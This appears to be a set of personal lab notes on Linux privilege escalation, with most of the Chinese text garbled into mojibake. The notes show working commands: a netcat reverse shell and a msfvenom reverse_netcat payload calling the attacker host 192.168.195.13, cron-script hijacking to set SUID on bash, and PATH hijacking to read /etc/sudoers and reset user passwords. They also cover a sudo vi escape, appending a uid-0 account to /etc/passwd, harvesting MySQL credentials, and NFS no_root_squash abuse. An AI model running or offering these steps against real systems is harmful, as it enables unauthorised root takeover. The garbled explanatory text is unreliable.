echo "/bin/bash" >autoscript.sh  ä¸å¥½ä½¿ï¼

åå¼¹ä¸€ä¸ªshell
æ–¹æ³•2
echo "nc -nv 192.168.195.13 8888 -e /bin/bash" >autoscript.sh ä¸å¥½ä½¿ï¼
æ–¹æ³•3ï¼š
åˆ©ç”¨msfvenomç”Ÿæˆä¸€ä¸ªåå‘shell
msfvenom -p cmd/unix/reverse_netcat lhost=192.168.195.13 lport=8888

â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# msfvenom -p cmd/unix/reverse_netcat lhost=192.168.195.13 lport=8888
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 104 bytes
mkfifo /tmp/iibhxgy; nc 192.168.195.13 8888 0</tmp/iibhxgy | /bin/sh >/tmp/iibhxgy 2>&1; rm /tmp/iibhxgy


æŠŠç”Ÿæˆçš„payloadå†™å…¥è„šæœ¬ä¸­
echo 'mkfifo /tmp/iibhxgy; nc 192.168.195.13 8888 0</tmp/iibhxgy | /bin/sh >/tmp/iibhxgy 2>&1; rm /tmp/iibhxgy' > autoscript.sh


Kali
nc -nvp 8888

cat >> autoscript.py << EOF
#!/usr/bin/env python
import os
import sys
try:
	os.system('chmod u+s /bin/bash')
except:
	sys.exit()
EOF
rootç”¨æˆ·ä¸‹æ”¹

èƒŒæ™¯ï¼šä»»åŠ¡è®¡åˆ’é‡Œæœ‰ä¸€ä¸ªä»¥rootç”¨æˆ·æ‰§è¡Œçš„Pyè„šæœ¬

å®éªŒç¯å¢ƒçš„å‡†å¤‡
ä»¥rootç”¨æˆ·ç™»å½• ï¼ˆå¯†ç ï¼š12345ï¼‰	
sed -i 's#autoscript.sh#autoscript.py#' /etc/crontab  //æŸ¥æ‰¾æ›¿æ¢
æ•ˆæœå¦‚ä¸‹ï¼š
cat /etc/crontab
*/5  *    * * * root    /home/user4/Desktop/autoscript.py
å¼€å§‹å®æ–½ææƒ
ï¼ˆ1ï¼‰å…ˆåœ¨Kaliç«¯æ‰‹åŠ¨ç¼–å†™ä¸€ä¸ªautoscript.pyè„šæœ¬ï¼Œå†…å®¹å¦‚ä¸‹
#!/usr/bin/env python
import os
import sys
try:
	os.system('chmod u+s /bin/bash')
except:
	sys.exit()
æ¶è®¾ä¸€ä¸ªHTTPæœåŠ¡å™¨
python3 -m http.server 9000
ï¼ˆ2ï¼‰é¶æœºåˆ‡æ¢åˆ°user4
cd /home/user4/Desktop
ä½¿ç”¨Â wget http://192.168.195.13:9000/autoscript.py
chmod +x autoscript.py
ï¼ˆ3ï¼‰æ•ˆæœï¼ˆç­‰5åˆ†é’Ÿï¼‰
ls -l /bin/bash
/bin/bash ä¸è¡Œ
/bin/bash -p
é«˜ç‰ˆæœ¬çš„Linuxä¸­ï¼Œå¦‚æœå¯åŠ¨bashçš„Effectiveï¼ˆæœ‰æ•ˆçš„ï¼‰ UIDä¸Realï¼ˆçœŸå®çš„ï¼‰ UIDä¸ç›¸åŒï¼Œè€Œä¸”æ²¡æœ‰ä½¿ç”¨-på‚æ•°ï¼Œåˆ™bashä¼šå°†Effective UID è¿˜åŸæˆReal UID

Method6:Exploiting SUDO rights of vi editor
åˆ©ç”¨sudoå»è¿è¡Œviç¼–è¾‘å™¨å®æ–½ææƒ

1ï¼‰åˆ©ç”¨ä¹‹å‰çš„æ–¹æ³•æŸ¥çœ‹sudoæˆæƒé…ç½®æ–‡ä»¶/etc/sudoers
echo 'cat /etc/sudoers' >/tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
/home/user5/script 


root    ALL=(ALL:ALL) ALL
user1   ALL=(ALL:ALL) ALL
user2   ALL=(user1) ALL
user8   ALL=(root) NOPASSWD: /usr/bin/vi

2ï¼‰æ›´æ”¹user8çš„ç”¨æˆ·å£ä»¤
echo 'echo "user8:xiao" | chpasswd' >/tmp/ls
/home/user5/script 
su - user8

sudo -l æŸ¥çœ‹æˆæƒåˆ—è¡¨

:!/bin/bash  æ­¤æ—¶å°±æ˜¯ä»¥rootç”¨æˆ·èº«ä»½æ‰§è¡Œbash



PS1ï¼šä½¿ç”¨visudoç¼–è¾‘ä¿®æ”¹æˆæƒé…ç½®æ–‡ä»¶/etc/sudoers



Method7 åˆ©ç”¨ç®¡ç†ç”¨æˆ·è¿›è¡Œææƒ

user1   ALL=(ALL:ALL) ALL
user2   ALL=(user1) ALL
1ï¼‰å…ˆæ”¹User1å’ŒUser2çš„å¯†ç 
echo 'echo "user2:xiao" | chpasswd' >/tmp/ls
/home/user5/script 
echo 'echo "user1:xiao" | chpasswd' >/tmp/ls
/home/user5/script 




2ï¼‰
å…ˆåˆ‡æ¢åˆ°user1çš„shell
sudo -u user1 /bin/bash
3ï¼‰
å†ç”±user1åˆ‡æ¢åˆ°ç®¡ç†å‘˜Â sudo su -

2ï¼‰å’Œ3ï¼‰æ‰§è¡Œä¸€æ­¥å°±è¡Œsudo -u user1 sudo su -

user2Â î‚°Â ~Â î‚°Â sudo -u user1 sudo su -
sudo -u user1 sudo su -
[sudo] password for user2: xiao

[sudo] password for user1: xiao

sudo -k  æ¸…é™¤å‡­æ®

Method 7: Exploiting writable permission of /etc/passwd file
åˆ©ç”¨å¯¹/etc/passwdæ–‡ä»¶å…·æœ‰å†™å…¥æƒé™çš„èƒ½åŠ›è¿›è¡Œææƒ
æ€è·¯ï¼šå¯ä»¥å†™ä¸€ä¸ªè¶…çº§ç”¨æˆ·ï¼ˆuidå·ä¸º0çš„ç”¨æˆ·ï¼‰

user6  / | var | www | html  grep root /etc/group                             
grep root /etc/group
root:x:0:user4,user7

echo 'echo "user7:xiao" | chpasswd' >/tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
/home/user5/script 
echo 'echo "user4:xiao" | chpasswd' >/tmp/ls
/home/user5/script 


root:x:0:0:root:/root:/bin/bash
ç”¨æˆ·å:å¯†ç :ç”¨æˆ·id:ç»„id:ç”¨æˆ·æè¿°ï¼šå®¶ç›®å½•ï¼šç”¨æˆ·shell
å¯†ç éƒ¨åˆ†ä¸ºxè¡¨æ˜å¯†ç æ˜¯å­˜å‚¨åœ¨/etc/shadowæ–‡ä»¶ä¸­

ec
//æ­¤å¤„çš„å¯†ç ä¸èƒ½æ˜¯æ˜æ–‡å½¢å¼ï¼Œå¿…é¡»æ˜¯ä½¿ç”¨çš„å“ˆå”ç®—æ³•äº§ç”Ÿçš„å¯†æ–‡

echo 'test:$1$test$at615QShYKduQlx5z9Zm7/:0:0:root:/root:/bin/bash' >>/etc/passwd


Method8:åˆ©ç”¨MySQLæ•°æ®åº“é…ç½®ä¸å½“ææƒ

ï¼ˆ1ï¼‰netstat -tnlp
ï¼ˆ2ï¼‰mysql -uroot -prootï¼ˆå­˜åœ¨å¼±å£ä»¤ï¼‰
	select * from user.user_info;
	å¾—åˆ°äº†mysqlçš„ç”¨æˆ·å£ä»¤mysql@12345
ï¼ˆ3ï¼‰åˆ©ç”¨mysqlç”¨æˆ·ç™»å½• 
	su - mysql
ï¼ˆ4ï¼‰chmod +644 .user_informations
ï¼ˆ5ï¼‰cat .user_informations å¾—åˆ°äº†ç”¨æˆ·çš„å¯†ç ä¿¡æ¯
user2:user2@12345
user3:user3@12345
user4:user4@12345
user5:user5@12345
user6:user6@12345
user7:user7@12345
user8:user8@12345
ï¼ˆ6ï¼‰cat /etc/mysql/secret.cnfï¼Œå¾—åˆ°äº†rootçš„å£ä»¤
root@12345
Method10: NFSææƒ
NFS---æ–‡ä»¶æœåŠ¡å™¨
/home/user5   192.168.195.33(rw,no_root_squash)  
ç®¡ç†å‘˜åšå‡ºäº†é”™è¯¯çš„é…ç½®

Kali
ï¼ˆ1ï¼‰æŸ¥è¯¢å…±äº«
showmount -e 192.168.195.177
ï¼ˆ2ï¼‰mkdir /tmp/nfs  
mount -t nfs 192.168.195.177:/home/user5 /tmp/nfs
PS:å¸è½½è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿ umount /tmp/nfsï¼ˆæŒ‚è½½ç‚¹ï¼‰

df -T
ï¼ˆ3ï¼‰cd /tmp/nfs ï¼ˆæ­¤æ—¶å¯¹è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿå…·æœ‰rootæƒé™ï¼Œå¯ä»¥å¤åˆ¶ä¸€ä¸ªshellï¼Œå¹¶ç»™äºˆsuidä½ï¼‰
     cp /usr/bin/sh  .
     chmod u+sx sh	 
åœ¨ç›®æ ‡
/home/user5/sh -p











































 
Â 





































